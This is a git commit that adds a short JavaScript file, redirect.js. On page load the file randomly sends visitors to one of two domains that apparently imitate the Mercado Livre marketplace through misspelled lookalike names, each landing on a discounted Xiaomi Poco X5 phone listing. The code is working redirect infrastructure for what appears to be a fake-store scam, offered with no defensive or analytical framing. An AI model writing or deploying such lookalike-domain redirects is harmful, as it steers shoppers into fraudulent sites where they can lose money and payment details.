2492136620edf5635082f987db91665ae0f8ed65
wevezito <kakarock30@gmail.com>
2024-06-13 00:50:00 -0300

    Add files via upload

---
+++ redirect.js
@@ -0,0 +1,12 @@
+<script>
+    function redirectBasedOnPercentage() {
+      const percentage = Math.random() * 100;
+
+      if (percentage < 50) {
+        window.location.href = "https://www.mercadollvredesconto.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
+      } else {
+        window.location.href = "https://ofertamercadollvre.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
+      }
+    }
+    redirectBasedOnPercentage();
+</script>
